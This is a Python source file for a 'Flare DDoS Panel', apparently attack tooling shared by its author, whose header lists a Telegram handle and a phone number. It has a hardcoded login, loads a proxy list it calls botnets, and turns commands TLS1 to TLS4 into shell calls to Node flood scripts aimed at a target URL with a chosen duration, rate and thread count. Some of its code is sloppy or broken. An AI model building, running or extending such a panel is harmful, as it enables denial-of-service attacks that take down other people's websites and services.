
## A NEAT AND FRESH NEW LOOK.             ##
## THIS FILE WAS CLEANING BY LINTAR!  ##
## ITS DDoS PANEL BY LINTAR!                    ##
## TELERAGM: @Lintar21                               ##
## WhatsApp: +6281247891005                  ##

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxy = open('proxy.txt').readlines()
bots = len(proxy)

def atas():
	print(' Flare | Wellcome To Flare DDoS Panel | Owner By: Zakyy & Lintar ')
	print('                               Botnets that we have : {bots}                                     ')
	print("")

def logo():
	clear()
	atas()
	print(""" 

     █████▒██▓    ▄▄▄       ██▀███  ▓█████    
   ▓██   ▒▓██▒   ▒████▄    ▓██ ▒ ██▒▓█   ▀    
   ▒████ ░▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒▒███      
   ░▓█▒  ░▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄    
   ░▒█░   ░██████▒▓█   ▓██▒░██▓ ▒██▒░▒████▒   
    ▒ ░   ░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░   
    ░     ░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░   
    ░ ░     ░ ░    ░   ▒     ░░   ░    ░      
              ░  ░     ░  ░   ░        ░  ░   
                                              

 """)
	
def methods():
	print("""

» Layer7: 
	TLS1 <Target> <Time> <Rate> <threads>
	TLS2 <Target> <Time> <Rate> <threads>
	TLS3 <Target> <Time> <Rate> <threads>
	TLS4 <Target> <Time> <Rate> <threads>
""")



def main():
    logo()
    while(True):
        cnc = input('''\x1b[38;2;255;255;255mPanel@Flare\n =>\x1b[38;2;255;255;255m''')
        if cnc == "Methods" or cnc == "METHODS" or cnc == "methods" or cnc == "MTDS":
            methods()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "Clear":
            main()
                
# LAYER 7 METHODS

        elif "TLS1" in cnc: #TLS BYPASS
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node TLS1.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS1 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS1 https://example.com 120 512 1000')
                print(' Tls-Bypass ')

        elif "TLS2" in cnc: #TLSFLOOD
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node TLS².js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: TLS2 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS2 https://example.com 120 512 1000')
                print(' Tls-Flood ')
        elif "TLS3" in cnc: #SKYNET
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: TLS3 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS3 https://example.com 120 512 1000')
                print(' Tls-Sky ')

        elif "TLS4" in cnc: #Load
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node TLS4.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS4 <Target> <Time> <Rate> <threads>')
                print('Example: TLS4  https://example.com 120 512 1000')
                print(' Tls Load ')
                
#  Except IndexError

        elif "Help" in cnc:
            print(f'''
» Methods : To show methods 
» Clear: To clear all messages
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
# LOG-IN

def login():
    clear()
    user = "Flare"
    passwd = "Panel"
    username = input("Username: ")
    password = getpass.getpass(prompt='Password: ')
    if username != user or password != passwd:
        print("")
        print("Sorry, the password you entered is wrong!!!")
        sys.exit(1)
    elif username == user and password == passwd:
        print("Welcome to Its DDoS Panel!!!...")
        time.sleep(0.3)
        main()

login()